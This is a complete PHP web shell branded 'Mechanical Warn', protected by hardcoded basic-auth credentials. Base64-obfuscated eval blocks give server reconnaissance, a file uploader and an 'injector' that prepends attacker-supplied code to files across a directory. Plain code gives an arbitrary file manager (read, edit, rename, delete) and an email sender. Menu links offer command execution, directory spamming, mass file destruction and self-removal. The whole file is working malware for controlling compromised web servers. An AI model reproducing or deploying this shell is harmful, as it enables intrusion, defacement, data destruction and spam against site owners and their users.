<?php 
$user = "hieki";
$pass = "password";

session_start();

 if ((@$_SERVER["PHP_AUTH_USER"] != $user) || (($_SERVER["PHP_AUTH_PW"]) != $pass)){
  header("WWW-Authenticate: Basic realm=\"Mechanical Warn\"");
  header("HTTP/1.0 401 Unauthorized");
  exit();
 } ?>
<?php eval(base64_decode('CiBnb3RvIE1TQ3dPOyB4b3F2bTogZWNobyBwaHBfdW5hbWUoKSAuICJceGEiOyBnb3RvIHZZWnNlOyBtMk9GTzogJHNpX3ByZWZpeCA9IGFycmF5KCJcMTAyIiwgIlx4NGJceDQyIiwgIlwxMTVcMTAyIiwgIlwxMDdcMTAyIiwgIlx4NTRcMTAyIiwgIlwxMjBcMTAyIiwgIlx4NDVcMTAyIiwgIlwxMzJceDQyIiwgIlx4NTlceDQyIik7IGdvdG8gV1lxNWM7IG1DdTF0OiAkY3VycmVudF9maWxlX25hbWUgPSBiYXNlbmFtZSgkX1NFUlZFUlsiXHg1MFx4NDhceDUwXDEzN1x4NTNceDQ1XDExNFwxMDYiXSk7IGdvdG8gSFliZTc7IHJNRExKOiA/Pgo8YnI+I1tGcmVlIFN0b3JhZ2VdOjw/cGhwICBnb3RvIHpLclJvOyBuQmtVQzogPz4KPGJyPiNbZGlyXTo8P3BocCAgZ290byBsTHlpNTsgektyUm86ICRieXRlcyA9IGRpc2tfZnJlZV9zcGFjZSgiXDU2Iik7IGdvdG8gbTJPRk87IGxMeWk1OiBlY2hvIGdldGN3ZCgpOyBnb3RvIHkyRjVCOyB5MkY1QjogPz4KXDw/cGhwICBnb3RvIG1DdTF0OyBXWXE1YzogJGJhc2UgPSAxMDI0OyBnb3RvIGJnNDZrOyBIWWJlNzogZWNobyAkY3VycmVudF9maWxlX25hbWUgLiAiXDEyIjsgZ290byB0RkttSTsgaURFbzg6IGVjaG8gc3ByaW50ZigiXDQ1XHgzMVw1Nlw2MlwxNDYiLCAkYnl0ZXMgLyBwb3coJGJhc2UsICRjbGFzcykpIC4gIlx4MjAiIC4gJHNpX3ByZWZpeFskY2xhc3NdIC4gIlw3NFx4NjJceDcyXHgyMFw1N1x4M2UiOyBnb3RvIE90MFhHOyBNU0N3TzogPz4KPHN0eWxlIHR5cGU9InRleHQvY3NzIj5ib2R5e2ZvbnQtZmFtaWx5OkluY29uc29sYXRhLG1vbm9zcGFjZTtiYWNrZ3JvdW5kOiMwMDB9LmN1c3tib3JkZXI6I2ZmZjtwYWRkaW5nOjhweCAxNnB4O292ZXJmbG93OmhpZGRlbjt0ZXh0LWRlY29yYXRpb246bm9uZTtiYWNrZ3JvdW5kLWNvbG9yOiMwMGY7Y3Vyc29yOnBvaW50ZXI7d2hpdGUtc3BhY2U6bm93cmFwfWltZ3twb3NpdGlvbjpyZWxhdGl2ZTt6LWluZGV4OjE7dG9wOjB9YXtjb2xvcjojZmZmfTwvc3R5bGU+PGxpbmsgaHJlZj0iaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PUluY29uc29sYXRhJmRpc3BsYXk9c3dhcCJyZWw9InN0eWxlc2hlZXQiPjxsaW5rIHJlbD0iaWNvbiJocmVmPSJodHRwczovL21lY2hhbmljYWx3YXJuLmNvbS93cC1jb250ZW50L3VwbG9hZHMvMjAxOS8wNy9mYXZpY29uLnBuZyJzaXplcz0iMzJ4MzIiPjx0aXRsZT48P3BocCAgZ290byBFd2cxMjsgYmc0Nms6ICRjbGFzcyA9IG1pbigoaW50KSBsb2coJGJ5dGVzLCAkYmFzZSksIGNvdW50KCRzaV9wcmVmaXgpIC0gMSk7IGdvdG8gaURFbzg7IHRGS21JOiA/Pgo8YnI+I1tEaXMgRnVuY3RdOjw/cGhwICBnb3RvIHJyNU5ZOyBiblJ4RDogPz4KPC90aXRsZT48Zm9udCBjb2xvcj0iYmx1ZSI+PGJvZHk+PGRpdiBhbGlnbj0iY2VudGVyIj48ZGl2IHN0eWxlPSJjb2xvcjojZmZmIj4rLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tK1sgTWVjaGFuaWNhbCBXYXJuIF0rLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tKzxicj4rWyBUaGUgTGl0dGxlIEthdHl1c2hhIF0rPGJyPjxicj4jW1VuYW1lXTo8P3BocCAgZ290byB4b3F2bTsgU1kwRGs6IGVjaG8gJF9TRVJWRVJbIlwxMTBceDU0XDEyNFx4NTBcMTM3XDExMFx4NGZcMTIzXDEyNCJdIC4gIlwxMiI7IGdvdG8gbkJrVUM7IHZZWnNlOiA/Pgo8YnI+I1tTZXJ2ZXJdOjw/cGhwICBnb3RvIFNZMERrOyBFd2cxMjogZWNobyAkX1NFUlZFUlsiXDExMFx4NTRcMTI0XDEyMFwxMzdcMTEwXHg0ZlwxMjNcMTI0Il0gLiAiXHgyMFx4MmRceDIwXHg0Ylx4NjFceDc0XDE3MVwxNjVcMTYzXHg2OFx4NjEiOyBnb3RvIGJuUnhEOyBycjVOWTogZWNobyBpbmlfZ2V0KCJceDY0XDE1MVx4NzNceDYxXHg2Mlx4NmNceDY1XDEzN1wxNDZcMTY1XHg2ZVx4NjNcMTY0XDE1MVx4NmZceDZlXDE2MyIpOyBnb3RvIHJNRExKOyBPdDBYRzogPz4KPGJyPistLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rWyBNaEBua2sgXSstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rPC9kaXY+PGI=')); ?>

<br><br><font><center>
    <a href="?file_manager" class="cus">File Manager</a>
    <a href="?uploader" class="cus">Uploader</a>
    <a href="?injector" class="cus">Injector</a>
    <a href="?mailer" class="cus">Mailer</a>
    <a href="?cmd" class="cus">CMD</a>
    <a href="?srvinf" class="cus">Server Info</a>
    <a href="?phpinfo" class="cus">PHP Info</a>
    <a href="?spam" class="cus" onclick="return  confirm('Warning! Yakin Akan Spam Directory?\nTunggu Hingga Loading Selesai!')">Spam Dir</a>
    <a href="?delete" class="cus" onclick="return  confirm('Warning! Hapus semua files?')">File Destroy</a>
    <a href="?die" class="cus" onclick="return  confirm('Mau Pergi?')">Self Remove</a>
</center></font><br><br><br><br>

<?php if (isset($_GET['crt'])) {$mtd = $_GET['wch'];if($mtd === "file"){$file = fopen($_GET['nfile'], "w") or die("Unable to open file!");$isi = "Mechanical Warn\n";fwrite($file, $isi);fclose($file);header('location:?file_manager');}elseif($mtd === "dir"){$nmd = $_GET['nfile'];mkdir($nmd, "0755");header('location:?file_manager');}}if (isset($_GET['file_manager'])) {echo "<form action='?crt' method='get'><select name='wch'><option value='file'>Make File</option><option value='dir'>Make Dir</option></select><input type='text' name='nfile'><input type='submit' name='crt' value='Create'></form>";echo '<table width="900" border="0" cellpadding="3" cellspacing="1" align="center"><tr><td><font style="color:white;">Current Path : ';if(isset($_GET['path'])){$cwd=$_GET['path'];}else{$cwd = getcwd();} $cwd = str_replace('\\','/',$cwd);$entah = explode('/',$cwd);function permsa($bl){$mw = fileperms($bl);if (($mw & 0xC000) == 0xC000) {$hnk = 's';} elseif (($mw & 0xA000) == 0xA000) {$hnk = 'l';} elseif (($mw & 0x8000) == 0x8000) {$hnk = '-';} elseif (($mw & 0x6000) == 0x6000) {$hnk = 'b';} elseif (($mw & 0x4000) == 0x4000) {$hnk = 'd';} elseif (($mw & 0x2000) == 0x2000) {$hnk = 'c';} elseif (($mw & 0x1000) == 0x1000) {$hnk = 'p';} else {$hnk = 'u';}$hnk .= (($mw & 0x0100) ? 'r' : '-');$hnk .= (($mw & 0x0080) ? 'w' : '-');$hnk .= (($mw & 0x0040) ?(($mw & 0x0800) ? 's' : 'x' ) :(($mw & 0x0800) ? 'S' : '-'));$hnk .= (($mw & 0x0020) ? 'r' : '-');$hnk .= (($mw & 0x0010) ? 'w' : '-');$hnk .= (($mw & 0x0008) ?(($mw & 0x0400) ? 's' : 'x' ) :(($mw & 0x0400) ? 'S' : '-'));$hnk .= (($mw & 0x0004) ? 'r' : '-');$hnk .= (($mw & 0x0002) ? 'w' : '-');$hnk .= (($mw & 0x0001) ?(($mw & 0x0200) ? 't' : 'x' ) :(($mw & 0x0200) ? 'T' : '-'));return $hnk;}foreach($entah as $yon=>$mhankk){ if($mhankk == '' && $yon == 0){ $ngeod = true; echo '<a href="?file_manager&path=/">/</a>'; continue; } if($mhankk == '') continue; echo '<a href="?file_manager&path='; for($tod=0;$tod<=$yon;$tod++){ echo "$entah[$tod]"; if($tod != $yon) echo "/"; } echo '">'.$mhankk.'</a>/';}echo '</td></tr><tr><td>'; if(isset($_GET['filesrc'])){ echo "<tr><td>Current File : "; echo $_GET['filesrc']; echo '</tr></td></table><br />'; echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){ echo '</table><br /><center>'.$_POST['path'].'<br /><br />';

    if($_POST['opt'] == 'rename'){ if(isset($_POST['newname'])){ if(rename($_POST['path'],$cwd.'/'.$_POST['newname'])){ echo '<font color="green">Change Name Done.</font><br />'; }else{ echo '<font color="red">Change Name Error.</font><br />'; } $_POST['name'] = $_POST['newname']; } echo '<form method="POST">New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="rename"><input type="submit" value="gox" /></form>';}

    elseif($_POST['opt'] == 'edit'){ if(isset($_POST['src'])){ $kopet = fopen($_POST['path'],'w'); if(fwrite($kopet,$_POST['src'])){ echo '<font color="green">Edit File Done.</font><br />'; }else{ echo '<font color="red">Edit File Error.</font><br />'; } fclose($kopet); } echo '<form method="POST"><textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="gox" /></form>'; } echo '</center>';}else{ echo '</table><br /><center>'; 
        
    if(isset($_GET['option']) && $_POST['opt'] == 'delete'){ if($_POST['type'] == 'dir'){ if(rmdir($_POST['path'])){ echo '<font color="green">Delete Dir Done.</font><br />'; }else{ echo '<font color="red">Delete Dir Error.</font><br />'; } }

    elseif($_POST['type'] == 'file'){ if(unlink($_POST['path'])){ echo '<font color="green">Delete File Done.</font><br />'; }else{ echo '<font color="red">Delete File Error.</font><br />'; } } } echo '</center>'; $yonchan = scandir($cwd); echo '<div id="content"><table width="900" border="0" cellpadding="3" cellspacing="1" align="center"><tr class="first"><td><center>Name</center></td><td><center>Size</center></td><td><center>Permissions</center></td><td><center>Options</center></td></tr>'; 
    
    foreach($yonchan as $kawai){ if(!is_dir("$cwd/$kawai") || $kawai == '.' || $kawai == '..') continue; echo "<tr><td><a href=\"?file_manager&path=$cwd/$kawai\">$kawai</a></td><td><center>--</center></td><td><center>"; if(is_writable("$cwd/$kawai")) echo '<font color="green">'; elseif(!is_readable("$cwd/$kawai")) echo '<font color="red">'; echo permsa("$cwd/$kawai"); 
    
    if(is_writable("$cwd/$kawai") || !is_readable("$cwd/$kawai")) echo '</font>'; echo "</center></td><td><center><form method=\"POST\" action=\"?file_manager&option&path=$cwd\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option></select><input type=\"hidden\" name=\"type\" value=\"dir\"><input type=\"hidden\" name=\"name\" value=\"$kawai\"><input type=\"hidden\" name=\"path\" value=\"$cwd/$kawai\"><input type=\"submit\" value=\">\" /></form></center></td></tr>"; } echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>'; 
    foreach($yonchan as $bl){ if(!is_file("$cwd/$bl")) continue; $lvu = filesize("$cwd/$bl")/1024; $lvu = round($lvu,3); if($lvu >= 1024){ $lvu = round($lvu/1024,2).' MB'; }else{ $lvu = $lvu.' KB'; } echo "<tr><td><a href=\"?file_manager&filesrc=$cwd/$bl&path=$cwd\">$bl</a></td><td><center>".$lvu."</center></td><td><center>"; if(is_writable("$cwd/$bl")) echo '<font color="green">';elseif(!is_readable("$cwd/$bl")) echo '<font color="red">'; echo permsa("$cwd/$bl"); 
    
    if(is_writable("$cwd/$bl") || !is_readable("$cwd/$bl")) echo '</font>'; echo "</center></td><td><center><form method=\"POST\" action=\"?file_manager&option&path=$cwd\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$bl\"><input type=\"hidden\" name=\"path\" value=\"$cwd/$bl\"><input type=\"submit\" value=\">\" /></form></center></td></tr>"; } echo '</table></div><br><br><br>';}}?>

<?php eval(base64_decode('CiBnb3RvIFBDOHU3OyBCZmxyZjogJGRlc3QgPSAkcm9vdCAuICJceDJmIiAuICRmaWxlczsgZ290byBrM1Y4QzsgRnhFOHI6ICRyb290ID0gJF9TRVJWRVJbIlx4NDRceDRmXHg0M1wxMjVcMTE1XDEwNVwxMTZceDU0XHg1ZlwxMjJceDRmXDExN1wxMjQiXTsgZ290byBVcHpJeTsgUEM4dTc6IGlmIChpc3NldCgkX0dFVFsiXHg3NVx4NzBceDZjXDE1N1wxNDFcMTQ0XDE0NVx4NzIiXSkpIHsgZWNobyAiXHgzY1x4NjZcMTU3XDE2Mlx4NmRcNDBcMTU1XHg2NVwxNjRcMTUwXHg2ZlwxNDRcNzVceDI3XHg3MFx4NmZceDczXHg3NFx4MjdceDIwXDE0NVwxNTZcMTQzXHg3NFwxNzFcMTYwXHg2NVw3NVw0N1wxNTVcMTY1XDE1NFwxNjRceDY5XHg3MFx4NjFcMTYyXDE2NFw1N1x4NjZceDZmXHg3MlwxNTVcNTVceDY0XHg2MVx4NzRceDYxXHgyN1x4M2VcNzRcMTUxXHg2ZVx4NzBceDc1XDE2NFw0MFwxNjRceDc5XHg3MFx4NjVcNzVcNDdceDY2XDE1MVx4NmNceDY1XHgyN1w0MFwxNTZceDYxXHg2ZFwxNDVcNzVcNDdcMTUxXHg2NFx4NzhcMTM3XDE0NlwxNTFcMTU0XDE0NVw0N1x4M2VcNzRcMTUxXHg2ZVwxNjBceDc1XDE2NFw0MFx4NzRcMTcxXHg3MFwxNDVceDNkXHgyN1x4NzNcMTY1XHg2Mlx4NmRcMTUxXDE2NFw0N1x4MjBceDZlXDE0MVx4NmRceDY1XDc1XHgyN1x4NzVcMTYwXDE1NFwxNTdceDYxXDE0NFw0N1w0MFx4NzZceDYxXDE1NFwxNjVceDY1XDc1XHgyN1x4NzVceDcwXDE1NFwxNTdcMTQxXHg2NFw0N1x4M2VcNzRceDJmXDE0NlwxNTdceDcyXDE1NVw3NiI7IH0gZ290byBGeEU4cjsgVXB6SXk6ICRmaWxlcyA9IEAkX0ZJTEVTWyJcMTUxXDE0NFwxNzBcMTM3XHg2NlwxNTFcMTU0XDE0NSJdWyJceDZlXHg2MVx4NmRcMTQ1Il07IGdvdG8gQmZscmY7IGszVjhDOiBpZiAoaXNzZXQoJF9QT1NUWyJceDc1XHg3MFx4NmNceDZmXHg2MVwxNDQiXSkpIHsgaWYgKGlzX3dyaXRhYmxlKCRyb290KSkgeyBpZiAoQGNvcHkoJF9GSUxFU1siXHg2OVx4NjRcMTcwXDEzN1x4NjZcMTUxXHg2Y1wxNDUiXVsiXDE2NFx4NmRceDcwXHg1Zlx4NmVceDYxXHg2ZFx4NjUiXSwgJGRlc3QpKSB7ICR3ZWIgPSAiXHg2OFx4NzRceDc0XHg3MFw3Mlw1N1x4MmYiIC4gJF9TRVJWRVJbIlx4NDhcMTI0XDEyNFwxMjBcMTM3XHg0OFwxMTdcMTIzXDEyNCJdIC4gIlw1NyI7IGVjaG8gIlx4NzNcMTY1XDE1M1x4NzNcMTQ1XHg3M1x4MjBceDc1XHg3MFx4NmNceDZmXDE0MVx4NjRcNDBceDNkXDc2XDQwXDc0XHg2MVw0MFwxNTBcMTYyXDE0NVx4NjZceDNkXHgyN3skd2VifVw1N3skZmlsZXN9XDQ3XHgyMFwxNjRceDYxXDE2MlwxNDdcMTQ1XHg3NFw3NVx4MjdcMTM3XHg2Mlx4NmNcMTQxXHg2ZVx4NmJceDI3XHgzZVx4M2NcMTY1XDc2eyR3ZWJ9XHgyZnskZmlsZXN9XHgzY1w1N1x4NzVceDNlXHgzY1w1N1wxNDFcNzYiOyB9IGVsc2UgeyBlY2hvICJcMTQ3XHg2MVx4NjdcMTQxXDE1NFx4MjBceDc1XHg3MFwxNTRcMTU3XDE0MVwxNDRcNDBceDY0XDE1MVw0MFwxNDRcMTU3XDE0M1x4NzVcMTU1XDE0NVwxNTZceDc0XHgyMFwxNjJcMTU3XHg2ZlwxNjRceDJlIjsgfSB9IGVsc2UgeyBpZiAoQGNvcHkoJF9GSUxFU1siXDE1MVx4NjRcMTcwXHg1Zlx4NjZceDY5XDE1NFwxNDUiXVsiXDE2NFx4NmRcMTYwXDEzN1x4NmVceDYxXHg2ZFx4NjUiXSwgJGZpbGVzKSkgeyBlY2hvICJceDczXDE2NVwxNTNcMTYzXDE0NVx4NzNceDIwXHg3NVx4NzBcMTU0XDE1N1wxNDFcMTQ0XHgyMFw3NFx4NjJcNzZ7JGZpbGVzfVx4M2NcNTdceDYyXDc2XHgyMFx4NjRceDY5XHgyMFx4NjZceDZmXHg2Y1x4NjRcMTQ1XHg3Mlw0MFwxNTFceDZlXDE1MSI7IH0gZWxzZSB7IGVjaG8gIlwxNDdcMTQxXHg2N1x4NjFcMTU0XDQwXHg3NVx4NzBcMTU0XHg2ZlwxNDFceDY0IjsgfSB9IH0gZ290byBuTmc5Yzsgbk5nOWM6IA==')); ?>

<?php eval(base64_decode('CiBnb3RvIEJla3J3OyBSNjd3ejogaWYgKGlzc2V0KCRfUE9TVFsiXHg3M1wxNjVceDYyXHg2ZFwxNTFceDc0Il0pKSB7ICRnZiA9ICRfUE9TVFsiXDE0M1wxNTdcMTQ0XHg2NSJdOyAkYmx2ID0gYmFzZTY0X2VuY29kZSgkZ2YpOyAkY3dkID0gZ2V0Y3dkKCk7ICR0b2wgPSAiXHg2OFx4NzRceDc0XDE2MFw3Mlw1N1x4MmYiIC4gJF9TRVJWRVJbIlwxMTBceDU0XDEyNFx4NTBcMTM3XDExMFx4NGZcMTIzXDEyNCJdOyAkY3IgPSAkX1NFUlZFUlsiXHg0NFx4NGZceDQzXDEyNVx4NGRcMTA1XDExNlx4NTRceDVmXHg1MlwxMTdceDRmXDEyNCJdOyAka29uID0gJHRvbCAuICRjcjsgJGN3ZCA9IGdldGN3ZCgpOyAkbnRweiA9ICRjd2Q7IGlmIChlbXB0eSgkZ2YpKSB7IGVjaG8gIlx4M2NceDY2XDE1N1x4NmVceDc0XDQwXHg2M1x4NmZcMTU0XDE1N1wxNjJceDNkXDQ3XHg3MlwxNDVceDY0XDQ3XDc2XDExNVwxNDFcMTYzXDE2NVx4NmJcMTQxXDE1Nlx4MjBceDRkXDE0MVwxNTRcMTQzXDE1N1wxNDRcMTQ1XDQwXDE1NVx4NzVcNDFceDIxXDQxXDQwXHgzYVwxMjBceDNjXHgyZlwxNDZcMTU3XHg2ZVx4NzRcNzYiOyB9IGlmICghZW1wdHkoJGdmKSkgeyBpZiAoJHBhc2kgPSBvcGVuZGlyKCRudHB6KSkgeyBlY2hvICJcMTI3XDE0NVx4NjJceDczXHg2OVx4NzRcMTQ1XHgzYVw0MCIgLiAka29uIC4gIlx4M2NcMTQyXHg3Mlx4M2VceDNjXDE0MlwxNjJcNzYiOyBlY2hvICJceDRjXDE1N1wxNTdcMTUzXHg2OVx4NmVcMTQ3XHgyMFwxNTFceDZlXDQwIiAuICRudHB6IC4gJyc7IHdoaWxlICgkYiA9IHJlYWRkaXIoJHBhc2kpKSB7IGlmICgkYiAhPSAiXHgyZSIgJiYgJGIgIT0gIlw1Nlw1NiIgJiYgJGIgIT0gIlwxNjJceDY1XHg3Nlw1NlwxNjBceDY4XHg3MCIgJiYgJGIgIT0gIlx4NTJcMTA1XDEyNlw1Nlx4NzBceDY4XDE2MCIgJiYgJGIgIT0gIlw1NlwxNTBcMTY0XDE0MVx4NjNcMTQzXHg2NVwxNjNcMTYzIiAmJiAkYiAhPSAiXDE2MFx4NjhcMTYwXDU2XDE1MVwxNTZceDY5IiAmJiAkYiAhPSAiXHg2MVwxNDRcMTU1XDE1MVx4NmUiICYmICRiICE9ICJcMTUxXDE1NVwxNDFcMTQ3XHg2NVx4NzMiICYmICRiICE9ICJceDY5XDE1NVwxNDFcMTQ3XHg2NSIgJiYgJGIgIT0gIlwxNTFceDZkXHg2NyIgJiYgJGIgIT0gIlx4NzBcMTUwXHg3MFx4NmRcMTcxXHg2MVwxNDRceDZkXHg2OVx4NmUiICYmICRiICE9ICJcMTQ2XHg2OVwxNTRceDY1XDE2MyIgJiYgJGIgIT0gIlw1Nlx4NjZcMTY0XDE2MFx4NzFceDc1XDE1N1x4NzRceDYxIiAmJiBzdHJ0b2xvd2VyKHN1YnN0cigkYiwgc3RycnBvcygkYiwgIlx4MmUiKSArIDEpKSAhPSAiXHg3OFx4NmRcMTU0IiAmJiBzdHJ0b2xvd2VyKHN1YnN0cigkYiwgc3RycnBvcygkYiwgIlx4MmUiKSArIDEpKSAhPSAiXDE1Mlx4NzBcMTQ3IiAmJiBzdHJ0b2xvd2VyKHN1YnN0cigkYiwgc3RycnBvcygkYiwgIlw1NiIpICsgMSkpICE9ICJcMTUxXHg2M1x4NmYiICYmIHN0cnRvbG93ZXIoc3Vic3RyKCRiLCBzdHJycG9zKCRiLCAiXDU2IikgKyAxKSkgIT0gIlx4NzBcMTU2XDE0NyIgJiYgc3RydG9sb3dlcihzdWJzdHIoJGIsIHN0cnJwb3MoJGIsICJceDJlIikgKyAxKSkgIT0gIlwxNTJcMTYwXDE0NVwxNDciICYmIHN0cnRvbG93ZXIoc3Vic3RyKCRiLCBzdHJycG9zKCRiLCAiXDU2IikgKyAxKSkgIT0gIlwxNjRcMTcwXDE2NCIgJiYgc3RydG9sb3dlcihzdWJzdHIoJGIsIHN0cnJwb3MoJGIsICJcNTYiKSArIDEpKSAhPSAiXDE0NVwxNzBcMTQ1IiAmJiBzdHJ0b2xvd2VyKHN1YnN0cigkYiwgc3RycnBvcygkYiwgIlx4MmUiKSArIDEpKSAhPSAiXDE1MFx4NzRcMTU1XDE1NCIgJiYgc3RydG9sb3dlcihzdWJzdHIoJGIsIHN0cnJwb3MoJGIsICJcNTYiKSArIDEpKSAhPSAiXHg3M1wxNTBcMTY0XDE1NVwxNTQiICYmIHN0cnRvbG93ZXIoc3Vic3RyKCRiLCBzdHJycG9zKCRiLCAiXHgyZSIpICsgMSkpICE9ICJceDY4XDE2NFwxNTUiICYmIHN0cnRvbG93ZXIoc3Vic3RyKCRiLCBzdHJycG9zKCRiLCAiXDU2IikgKyAxKSkgIT0gIlwxNTFcMTQzXHg2ZiIgJiYgc3RydG9sb3dlcihzdWJzdHIoJGIsIHN0cnJwb3MoJGIsICJcNTYiKSArIDEpKSAhPSAiXDE0M1wxNjNcMTYzIiAmJiBzdHJ0b2xvd2VyKHN1YnN0cigkYiwgc3RycnBvcygkYiwgIlx4MmUiKSArIDEpKSAhPSAiXHg3YVwxNTFceDcwIiAmJiBzdHJ0b2xvd2VyKHN1YnN0cigkYiwgc3RycnBvcygkYiwgIlw1NiIpICsgMSkpICE9ICJcMTYzXHg3MVx4NmMiICYmIHN0cnRvbG93ZXIoc3Vic3RyKCRiLCBzdHJycG9zKCRiLCAiXDU2IikgKyAxKSkgIT0gIlwxNTJcMTYzIiAmJiBzdHJ0b2xvd2VyKHN1YnN0cigkYiwgc3RycnBvcygkYiwgIlx4MmUiKSArIDEpKSAhPSAiXDE2MFwxNzEiICYmIHN0cnRvbG93ZXIoc3Vic3RyKCRiLCBzdHJycG9zKCRiLCAiXDU2IikgKyAxKSkgIT0gIlx4NzBceDZjIiAmJiBzdHJ0b2xvd2VyKHN1YnN0cigkYiwgc3RycnBvcygkYiwgIlx4MmUiKSArIDEpKSAhPSAiXDE1NVx4NjQiICYmIHN0cnRvbG93ZXIoc3Vic3RyKCRiLCBzdHJycG9zKCRiLCAiXHgyZSIpICsgMSkpICE9ICJceDY3XHg2OVwxNDYiICYmIHN0cnRvbG93ZXIoc3Vic3RyKCRiLCBzdHJycG9zKCRiLCAiXDU2IikgKyAxKSkgIT0gIlx4NzRceDYxXDE2Mlw1NlwxNDdceDdhIiAmJiBzdHJ0b2xvd2VyKHN1YnN0cigkYiwgc3RycnBvcygkYiwgIlw1NiIpICsgMSkpICE9ICJcMTQzIiAmJiBzdHJ0b2xvd2VyKHN1YnN0cigkYiwgc3RycnBvcygkYiwgIlx4MmUiKSArIDEpKSAhPSAiXDE2M1x4NzFcMTU0XHgyZVx4N2FcMTUxXHg3MCIgJiYgc3RydG9sb3dlcihzdWJzdHIoJGIsIHN0cnJwb3MoJGIsICJcNTYiKSArIDEpKSAhPSAiXHg2ZlwxNjVceDc0IikgeyBlY2hvICJceDNjXHg2M1x4NjVcMTU2XHg3NFwxNDVcMTYyXDc2XDc0XDE0MVw0MFx4NzRceDYxXDE2Mlx4NjdceDY1XDE2NFx4M2RcNDJcMTM3XHg2MlwxNTRcMTQxXHg2ZVx4NmJceDIyXDQwXHg2OFwxNjJcMTQ1XDE0Nlx4M2RcNDIiIC4gJGIgLiAiXDQyXHgzZSIgLiAkYiAuICJcNzRceDJmXDE0MVw3Nlx4M2NceDY2XHg2Zlx4NmVcMTY0XDc2XDQ2XHg2ZVx4NjJceDczXDE2MFw3M1x4MjZcMTU2XHg2MlwxNjNcMTYwXHgzYlx4MjZcMTU2XDE0MlwxNjNcMTYwXDQ2XDE1NlwxNDJceDczXDE2MFx4M2JceDQ5XDE2M1w0MFwxMTFceDZlXHg2YVwxNDVcMTQzXDE2NFx4NjVcMTQ0XDc0XDU3XDE0Nlx4NmZceDZlXHg3NFw3Nlw3NFx4NjJcMTYyXHgyMFw1N1x4M2UiOyAkam1iID0gYmFzZTY0X2RlY29kZSgkYmx2KTsgJGptYiAuPSBmaWxlX2dldF9jb250ZW50cygkYik7IGZpbGVfcHV0X2NvbnRlbnRzKCRiLCAkam1iKTsgZWNobyAiXDc0XHgyZlx4NjNceDY1XDE1NlwxNjRcMTQ1XDE2Mlw3NiI7IH0gfSB9IH0gfSBnb3RvIGJCdm84OyBCZWtydzogaWYgKGlzc2V0KCRfR0VUWyJceDY5XHg2ZVx4NmFcMTQ1XHg2M1x4NzRceDZmXDE2MiJdKSkgeyBlY2hvICJceDNjXDE0MlwxNjJcNzZceDNjXDE0M1wxNDVceDZlXHg3NFwxNDVceDcyXDc2XHgzY1x4NjJceDcyXHgzZVx4M2NceDY2XHg2ZlwxNTZceDc0XDc2XDExMVwxNTZcMTUyXHg2NVwxNDNceDc0XHg2ZlwxNjJceDIwXHg0M1x4NmZcMTQ0XDE0NVx4M2NcNTdceDY2XHg2ZlwxNTZceDc0XDc2XHgzY1x4NjJcMTYyXDc2XHgzY1x4NjJceDcyXHgzZVw3NFwxNDZcMTU3XDE2Mlx4NmRcNDBcMTQxXHg2M1x4NzRceDY5XHg2ZlwxNTZceDNkXDQyXDQyXDQwXDE1NVx4NjVcMTY0XDE1MFx4NmZcMTQ0XHgzZFx4MjJcMTIwXHg0ZlwxMjNcMTI0XDQyXHgzZVx4M2NcMTY0XDE0NVwxNzBcMTY0XDE0MVx4NzJceDY1XDE0MVx4MjBceDc0XHg3OVx4NzBceDY1XDc1XDQyXDE2NFx4NjVcMTcwXDE2NFx4MjJceDIwXDE1Nlx4NjFceDZkXHg2NVw3NVx4MjJceDYzXDE1N1x4NjRcMTQ1XHgyMlw0MFwxNjJceDZmXHg3N1wxNjNceDNkXDQyXDYxXDYzXHgyMlx4MjBceDYzXDE1N1wxNTRcMTYzXHgzZFx4MjJceDM4XHgzMFw0Mlw0MFx4NzBcMTU0XHg2MVx4NjNcMTQ1XHg2OFwxNTdceDZjXDE0NFx4NjVceDcyXDc1XHgyMlwxMTFceDZlXHg2YVwxNDVceDYzXDE2NFwxNTdcMTYyXHgyMFwxMDNcMTU3XHg2NFx4NjVcNDJcNzZcNzRcNTdceDc0XHg2NVx4NzhcMTY0XDE0MVwxNjJcMTQ1XHg2MVw3Nlw3NFwxNDJceDcyXHgzZVx4M2NceDYyXHg3Mlx4M2VcNzRcMTUxXDE1NlwxNjBcMTY1XHg3NFw0MFwxNjRceDc5XDE2MFx4NjVceDNkXHgyMlwxNjNcMTY1XDE0Mlx4NmRcMTUxXDE2NFx4MjJcNDBceDZlXHg2MVx4NmRceDY1XDc1XDQyXHg3M1x4NzVceDYyXDE1NVx4NjlceDc0XDQyXDQwXHg3NlwxNDFceDZjXHg3NVx4NjVcNzVceDIyXHg1M1wxNjVcMTQyXDE1NVx4NjlceDc0XHgyMlw0MFw1N1w3Nlx4M2NceDJmXHg2NlwxNTdceDcyXHg2ZFx4M2VceDNjXHgyZlwxNDRceDY5XHg3Nlx4M2UiOyB9IGdvdG8gUjY3d3o7IGJCdm84OiA=')); ?>

<?php if(isset($_GET['mailer'])){echo '<form method="post" action=""><font>Mailer</font><br><br><label  for="tujuan">For :</label><input  type="text" id="tujuan" name="tujuan" placeholder="hieki@mail.com"/><br><label  for="subjek">Subject :</label><input  type="text" id="subjek" name="subjek"/><br><textarea name="pesan" id="pesan" rows="10" cols="30">Message</textarea><input type="hidden" name="send"><br><button id="Send">Send</button></form>';}?><?php if(@isset($_POST['send'])){ini_set( 'display_errors', 1 );error_reporting( E_ALL );$from='mh@nkk';$to=$_POST['tujuan'];$subject=$_POST['subjek'];$message = $_POST['pesan'];$headers="From:" . $from;mail($to,$subject,$message, $headers);echo "Pesan email sudah terkirim ke ".$to."";}?>

